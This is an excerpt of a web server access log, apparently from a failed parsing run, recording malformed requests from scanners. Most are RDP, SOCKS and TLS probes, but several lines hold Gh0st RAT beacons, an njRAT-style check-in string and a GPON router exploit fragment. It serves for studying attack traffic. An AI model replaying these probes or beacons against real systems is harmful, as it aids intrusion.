7@@94.232.43.63 - - [27/Nov/2021:00:36:31 +0000] "\x03\x00\x00,'\xE0\x00\x00\x00\x00\x00Cookie: mstshash=Domain" 400 166 "-" "-"@@list index out of range
8@@94.232.43.63 - - [27/Nov/2021:00:36:31 +0000] "\x03\x00\x00,'\xE0\x00\x00\x00\x00\x00Cookie: mstshash=Domain" 400 166 "-" "-"@@list index out of range
126@@5.188.210.227 - - [27/Nov/2021:06:35:27 +0000] "\x05\x01\x00" 400 166 "-" "-"@@list index out of range
128@@5.188.210.227 - - [27/Nov/2021:06:36:50 +0000] "\x04\x01\x00P\x05\xBC\xD2\xE3\x00" 400 166 "-" "-"@@list index out of range
138@@178.128.194.144 - - [27/Nov/2021:07:00:46 +0000] "238\x00ll|'|'|SGFjS2VkX0Q3NUU2QUFB|'|'|WIN-QZN7FJ7D1O|'|'|Administrator|'|'|18-11-28|'|'||'|'|Win 7 Ultimate SP1 x64|'|'|No|'|'|S17|'|'|..|'|'|SW5ib3ggLSBPdXRsb29rIERhdGEgRmlsZSAtIE1pY3Jvc29mdCBPdXRsb29rAA==|'|'|" 400 166 "-" "-"@@list index out of range
163@@94.232.43.63 - - [27/Nov/2021:09:19:25 +0000] "\x03\x00\x00,'\xE0\x00\x00\x00\x00\x00Cookie: mstshash=Domain" 400 166 "-" "-"@@list index out of range
164@@94.232.43.63 - - [27/Nov/2021:09:19:25 +0000] "\x03\x00\x00,'\xE0\x00\x00\x00\x00\x00Cookie: mstshash=Domain" 400 166 "-" "-"@@list index out of range
171@@205.185.124.100 - - [27/Nov/2021:09:50:55 +0000] "" 400 0 "-" "-"@@list index out of range
269@@94.232.43.63 - - [26/Nov/2021:00:47:26 +0000] "\x03\x00\x00,'\xE0\x00\x00\x00\x00\x00Cookie: mstshash=Domain" 400 166 "-" "-"@@list index out of range
270@@94.232.43.63 - - [26/Nov/2021:00:47:26 +0000] "\x03\x00\x00,'\xE0\x00\x00\x00\x00\x00Cookie: mstshash=Domain" 400 166 "-" "-"@@list index out of range
273@@66.240.205.34 - - [26/Nov/2021:01:10:59 +0000] "Gh0st\xAD\x00\x00\x00\xE0\x00\x00\x00x\x9CKS``\x98\xC3\xC0\xC0\xC0\x06\xC4\x8C@\xBCQ\x96\x81\x81\x09H\x07\xA7\x16\x95e&\xA7*\x04$&g+\x182\x94\xF6\xB000\xAC\xA8rc\x00\x01\x11\xA0\x82\x1F\x5C`&\x83\xC7K7\x86\x19\xE5n\x0C9\x95n\x0C;\x84\x0F3\xAC\xE8sch\xA8^\xCF4'J\x97\xA9\x82\xE30\xC3\x91h]&\x90\xF8\xCE\x97S\xCBA4L?2=\xE1\xC4\x92\x86\x0B@\xF5`\x0CT\x1F\xAE\xAF]" 400 166 "-" "-"@@list index out of range
397@@20.68.10.178 - - [26/Nov/2021:05:04:50 +0000] "" 400 0 "-" "-"@@list index out of range
419@@172.104.131.24 - - [26/Nov/2021:06:46:35 +0000] "R\x93\x00\x00\xFF\xFF\xFF\xFF\x005ABC\x00" 400 166 "-" "-"@@list index out of range
421@@205.185.124.100 - - [26/Nov/2021:07:05:10 +0000] "" 400 0 "-" "-"@@list index out of range
481@@27.115.124.106 - - [26/Nov/2021:09:06:05 +0000] "\x16\x03\x01\x00\xB2\x01\x00\x00\xAE\x03\x03TsV\xD3\x88\xC9" 400 166 "-" "-"@@list index out of range
717@@5.188.210.227 - - [26/Nov/2021:17:23:29 +0000] "\x05\x01\x00" 400 166 "-" "-"@@list index out of range
718@@5.188.210.227 - - [26/Nov/2021:17:25:16 +0000] "\x04\x01\x00P\x05\xBC\xD2\xE3\x00" 400 166 "-" "-"@@list index out of range
748@@34.77.162.27 - - [26/Nov/2021:19:43:17 +0000] "\x16\x03\x01\x00\xE5\x01\x00\x00\xE1\x03\x03\xB0\xDE\x0F\xCE6\xD5R\xCFR\xE7\x88g\x91\xBAm\xDC\xE3\x98a\xE9\xD02i\x11\xD2\xCF\x04\xE6\xE6\xDB$\xD2\x00\x00h\xCC\x14\xCC\x13\xC0/\xC0+\xC00\xC0,\xC0\x11\xC0\x07\xC0'\xC0#\xC0\x13\xC0\x09\xC0(\xC0$\xC0\x14\xC0" 400 166 "-" "-"@@list index out of range
749@@94.232.43.63 - - [26/Nov/2021:19:46:59 +0000] "\x03\x00\x00,'\xE0\x00\x00\x00\x00\x00Cookie: mstshash=Domain" 400 166 "-" "-"@@list index out of range
750@@94.232.43.63 - - [26/Nov/2021:19:46:59 +0000] "\x03\x00\x00,'\xE0\x00\x00\x00\x00\x00Cookie: mstshash=Domain" 400 166 "-" "-"@@list index out of range
762@@71.6.158.166 - - [26/Nov/2021:20:36:59 +0000] "" 400 0 "-" "-"@@list index out of range
763@@71.6.158.166 - - [26/Nov/2021:20:37:00 +0000] "" 400 0 "-" "-"@@list index out of range
764@@71.6.158.166 - - [26/Nov/2021:20:37:01 +0000] "" 400 0 "-" "-"@@list index out of range
769@@71.6.158.166 - - [26/Nov/2021:20:37:10 +0000] "\x03uE\xA1a\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" 400 166 "-" "-"@@list index out of range
810@@20.55.53.144 - - [17/Nov/2021:00:53:40 +0000] "\x9E\x1E\xA4Z\x11\x90I\xC7`/\xEA" 400 166 "-" "-"@@list index out of range
854@@66.240.205.34 - - [17/Nov/2021:02:24:58 +0000] "Gh0st\xAD\x00\x00\x00\xE0\x00\x00\x00x\x9CKS``\x98\xC3\xC0\xC0\xC0\x06\xC4\x8C@\xBCQ\x96\x81\x81\x09H\x07\xA7\x16\x95e&\xA7*\x04$&g+\x182\x94\xF6\xB000\xAC\xA8rc\x00\x01\x11\xA0\x82\x1F\x5C`&\x83\xC7K7\x86\x19\xE5n\x0C9\x95n\x0C;\x84\x0F3\xAC\xE8sch\xA8^\xCF4'J\x97\xA9\x82\xE30\xC3\x91h]&\x90\xF8\xCE\x97S\xCBA4L?2=\xE1\xC4\x92\x86\x0B@\xF5`\x0CT\x1F\xAE\xAF]" 400 166 "-" "-"@@list index out of range
959@@167.71.102.181 - - [17/Nov/2021:05:53:34 +0000] "\x00\x0E8\x8A\xA52v\xA3,[\xF3\x00\x00\x00\x00\x00" 400 166 "-" "-"@@list index out of range
967@@143.244.133.162 - - [17/Nov/2021:06:33:10 +0000] "\x16\x03\x01\x01\xFE\x01\x00\x01\xFA\x03\x03v\xAA{\xE7\x90\xEF^\x8B_\x89p\xED\x18\xAB\xF9\xC9\x97Z\xF9\x0CY87\x04\xBA\xE4\x97\xE1\xDEE\x97\xEB\x00\x01<\xCC\x14\xCC\x13\xCC\x15\xC00\xC0,\xC0(\xC0$\xC0\x14\xC0" 400 166 "-" "-"@@list index out of range
970@@164.52.24.179 - - [17/Nov/2021:07:23:11 +0000] "\x16\x03\x01\x01 \x01\x00\x01\x1C\x03\x03O\xC5Qh\xEDp\xF7\xDAB{\xC2\xD3\xA0g\xA5\xFD\xCC\xF3\x06\xFC(&e\xFF\xF1b\x0CX\xD7\xD08= P@\x00M@\x90~\x14\x17\x18;\xEE\x88MJb\xE5H\x01\xC0\xB5#\x17ga\x12\x1DLn]\xBCn\x00>\x13\x02\x13\x03\x13\x01\xC0,\xC00\x00\x9F\xCC\xA9\xCC\xA8\xCC\xAA\xC0+\xC0/\x00\x9E\xC0$\xC0(\x00k\xC0#\xC0'\x00g\xC0" 400 166 "-" "-"@@list index out of range
971@@164.52.24.179 - - [17/Nov/2021:07:23:12 +0000] "\x16\x03\x01\x00\xBD\x01\x00\x00\xB9\x03\x03\xB5#\xDE\xD7\xB2\x845cW\xBBo\x86p~\xDE\x1E\x19\x90{\xF6\xB3\x16\x81\xCE\xB1\x18M\x18)FNY\x00\x008\xC0,\xC00\x00\x9F\xCC\xA9\xCC\xA8\xCC\xAA\xC0+\xC0/\x00\x9E\xC0$\xC0(\x00k\xC0#\xC0'\x00g\xC0" 400 166 "-" "-"@@list index out of range
972@@164.52.24.179 - - [17/Nov/2021:07:23:12 +0000] "\x16\x03\x01\x00c\x01\x00\x00_\x03\x02\xC8)\xDE\xC2f=\xB7d\xB5\x188\x80\xB2\x82\x0C\x92\xB91\xC5ol%D\xA0\x04\x9A\xA7\x10\xB9M\x17h\x00\x00\x12\xC0" 400 166 "-" "-"@@list index out of range
973@@164.52.24.179 - - [17/Nov/2021:07:23:13 +0000] "\x16\x03\x01\x00c\x01\x00\x00_\x03\x01\xC3\xA1\xAD7\x8B\xC2\xE8ku\xF7K\xFE\xFE\xA7\xBB\xF4wJUV\x80\xB0nw\x16\xDA\x8B\xDD\xAD&\xBA1\x00\x00\x12\xC0" 400 166 "-" "-"@@list index out of range
993@@138.68.249.116 - - [17/Nov/2021:09:39:37 +0000] "SSTP_DUPLEX_POST /sra_{BA195980-CD49-458b-9E23-C84EE0ADCD75}/ HTTP/1.1" 400 166 "-" "-"@@list index out of range
1026@@194.165.16.111 - - [17/Nov/2021:12:17:15 +0000] "\x03\x00\x00/*\xE0\x00\x00\x00\x00\x00Cookie: mstshash=Administr" 400 166 "-" "-"@@list index out of range
1027@@194.165.16.111 - - [17/Nov/2021:12:17:17 +0000] "\x03\x00\x00/*\xE0\x00\x00\x00\x00\x00Cookie: mstshash=Administr" 400 166 "-" "-"@@list index out of range
1094@@77.83.36.32 - - [17/Nov/2021:15:42:45 +0000] "\x03\x00\x00/*\xE0\x00\x00\x00\x00\x00Cookie: mstshash=Administr" 400 166 "-" "-"@@list index out of range
1096@@64.227.97.195 - - [17/Nov/2021:16:01:37 +0000] "\x00\x0E8\x09\x1A*@gFC\xA8\x00\x00\x00\x00\x00" 400 166 "-" "-"@@list index out of range
1112@@45.61.186.13 - - [17/Nov/2021:17:05:30 +0000] "" 400 0 "-" "-"@@list index out of range
1278@@172.104.131.24 - - [16/Nov/2021:02:39:05 +0000] "R\x93\x00\x00\xFF\xFF\xFF\xFF\x005ABC\x00" 400 166 "-" "-"@@list index out of range
1387@@185.254.31.134 - - [16/Nov/2021:08:21:20 +0000] "\x16\x03\x01\x01C\x01\x00\x01?\x03\x03\xB9\xAA\x0C\xF5U\xA1\xE6^\xAATP\xCA\x83" 400 166 "-" "-"@@list index out of range
1434@@222.186.19.235 - - [16/Nov/2021:10:25:41 +0000] "\x05\x01\x00" 400 166 "-" "-"@@list index out of range
1442@@59.99.140.36 - - [16/Nov/2021:11:01:58 +0000] "h+/tmp/gpon80&ipv=0" 400 166 "-" "-"@@list index out of range
1484@@45.61.186.13 - - [16/Nov/2021:14:05:36 +0000] "" 400 0 "-" "-"@@list index out of range
1485@@34.77.162.8 - - [16/Nov/2021:14:25:28 +0000] "\x16\x03\x01\x00\xE5\x01\x00\x00\xE1\x03\x03\xFBw\xA7\xC5\x86\x93\xC6\x05s:s\xEEOe\xB1k\xBA\x9A.D\x85\xC9<\x95\xD9\xC4Y\x04\xC0!1o\x00\x00h\xCC\x14\xCC\x13\xC0/\xC0+\xC00\xC0,\xC0\x11\xC0\x07\xC0'\xC0#\xC0\x13\xC0\x09\xC0(\xC0$\xC0\x14\xC0" 400 166 "-" "-"@@list index out of range
1507@@3.90.177.61 - - [16/Nov/2021:15:17:50 +0000] "\x15\x03\x01\x00\x02\x02P" 400 166 "-" "-"@@list index out of range
1508@@3.90.177.61 - - [16/Nov/2021:15:17:50 +0000] "\x15\x03\x01\x00\x02\x02P" 400 166 "-" "-"@@list index out of range
1566@@143.198.204.243 - - [16/Nov/2021:17:43:58 +0000] "" 400 0 "-" "-"@@list index out of range
1639@@185.181.102.18 - - [16/Nov/2021:22:34:23 +0000] "\x03\xEE1\x94a\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" 400 166 "-" "-"@@list index out of range
1727@@125.64.94.144 - - [15/Nov/2021:02:02:23 +0000] "\x5Cx01\x5Cx00\x5Cx00\x5Cx00 \x5Cxbf\x5Cx02\x5Cx00\x5Cx88\x5Cx13\x5Cx00\x5Cx00\x5Cx87\x5Cx00\x5Cx00\x5Cx00NIMABIJIAN\x5Cx04\x5Cx03\x5Cx00\x5Cx00{\x5Cx99Caig\x5Cx9c\x5Cx03\x5Cxc7eB\x5Cxc5\x5Ct\x5Cxc1\x5Cx18a\x5Cx11\x5Cx1a\x5Cx91\x5Cx1f\x5Cx02\x5Ctcof\x5Cx91\x5Cxc0\x5Cx80sJ5\x5Cxd2\x5Cx80\x5Cxe6\x5Cx9a~\x5Cxb9\x5Cxc7\x5Cx83^\x5Cx96\x5CxeeN\x5Cx16\x5Cx96\x5Cx96&\x5Cxe6\x5Cx03\x5Cxea\x5Cxbc\x5Cx81\x5Cx02=\x5Cxac\x5Cx10\x5Cxfa?7\x5Cx03\x5Cxc3\x5Cxdf\x5Cxf7\x5Cxe4\x5Cx98`p\x5Cxe6\x5Cx8d\x5Cxc1\x5Cxa9\x5Cx8d\x5Cxc6\x5Cx06\x5Cxdb\x5Cxaf\x5Cx91\x5Cxe7\x5Cx82s\x5Cxf7\x5Cx14H\x5Cxd4\x5Cxe1W\x5Cx9a\x5Cx93C\x5Cx9e]\x5Cxa4\x5Cx01#\x5Cx03#\x5Cx03]\x5Cx03c]CC\x5Cx05C\x5Cx03+S\x5Cx03b\x5Cxf4\x5Cx00\x5Cx00/\x5Cx9e\x5Cx16E" 400 166 "-" "-"@@list index out of range
1787@@54.242.191.231 - - [15/Nov/2021:03:26:46 +0000] "\x15\x03\x01\x00\x02\x02P" 400 166 "-" "-"@@list index out of range
1797@@54.242.191.231 - - [15/Nov/2021:03:26:47 +0000] "\x15\x03\x01\x00\x02\x02P" 400 166 "-" "-"@@list index out of range
1809@@139.59.69.106 - - [15/Nov/2021:04:28:10 +0000] "\x16\x03\x01\x01\xFE\x01\x00\x01\xFA\x03\x03O\x85X+w\xA0Y(V2\xBE\xCB\xB1\x1A\x91s\x01\xFB\xD7\xACjIC\xBA'\xC0\xCA\xB6\x81./Q\x00\x01<\xCC\x14\xCC\x13\xCC\x15\xC00\xC0,\xC0(\xC0$\xC0\x14\xC0" 400 166 "-" "-"@@list index out of range
